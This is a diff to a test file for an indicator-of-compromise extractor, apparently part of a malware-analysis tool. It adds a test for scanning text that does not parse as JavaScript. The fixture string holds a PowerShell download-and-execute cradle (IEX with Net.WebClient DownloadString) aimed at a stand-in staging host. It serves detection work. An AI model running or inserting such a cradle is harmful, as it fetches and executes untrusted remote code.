@@ -1,6 +1,6 @@
 import { test } from 'node:test';
 import { strict as assert } from 'node:assert';
-import { extractIocs } from '../src/analyzers/iocs';
+import { extractIocs, extractIocsFromText } from '../src/analyzers/iocs';
 import { parseCode } from '../src/parser';
 import { defang } from '../src/util';
 import { readExample } from './helpers';
@@ -142,4 +142,13 @@ test('iocs: oversized base64 blob is recorded but not decoded/recursed', () => {
   assert.ok(i.some(x => x.type === 'base64'), 'blob still recorded');
   assert.ok(!i.some(x => x.type === 'url' && x.value.includes('nested-c2')),
     'nested URL must not be decoded out of an oversized blob');
+});
+
+test('iocs: raw-text fallback scans input that does not parse as JS', () => {
+  const ps = "$u = 'https://stage.example.net/p.zip'\nIEX (New-Object Net.WebClient).DownloadString($u)\n";
+  const i = extractIocsFromText(ps);
+  const url = i.find(x => x.type === 'url');
+  assert.equal(url?.value, 'https://stage.example.net/p.zip');
+  assert.equal(url?.line, 1);
+  assert.ok(i.some(x => x.type === 'suspicious-command' && x.line === 2));
 });
